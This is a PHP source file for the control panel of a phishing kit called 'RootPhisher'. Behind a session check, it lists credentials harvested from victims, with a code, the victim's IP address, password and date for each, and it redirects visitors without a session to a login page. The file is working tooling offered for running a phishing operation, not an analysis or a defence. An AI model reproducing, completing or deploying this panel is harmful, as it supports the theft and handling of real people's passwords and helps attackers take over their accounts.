<?php

session_start();

include('db.inc.php');

$sess = $_SESSION['username'];

if(isset($sess)) {
   
    echo '<html><head><title>RootPhisher</title></head><body bgcolor="black"><center><h1 style="color: lime;">Rootphisher Control Panel</h1><h2 style="color: red;">Available codes</h2>';
    $var2 = "";
    $q4 = "SELECT * FROM data";
    $a4 = mysqli_query($link, $q4);
    echo '<br><br><table border=1 cellspacing=0 cellpadding=2 bordercolor="red" style="color: lime;"><tr><th>Code</th><th>IP Address</th><th>Password</th><th>Date</th></tr>';
    if ($row2 = mysqli_fetch_array($a4)) { 
       
        do { 
            $code = $row2['code'];
            $date = $row2['date'];
            $password = $row2['password'];
            $ip = $row2['ip'];
            $var2 = '<tr><td>'.$code.'</td><td>'.$ip.'</td><td>'.$password.'</td><th>'.$date.'</th></tr>' . $var2;
        } while ($row2 = mysqli_fetch_array($a4)); 
       
        } else { 
            echo "";
} 
   
echo $var2;
echo '</table><br><br><h2 style="color: lime;">Account settings</h2><a href="/changepwd.php">Change Password</a><br><br><a href="/logout.php">Logout</a></center></body></html>';

} else {

    header("Location: login.php");

}


?> 
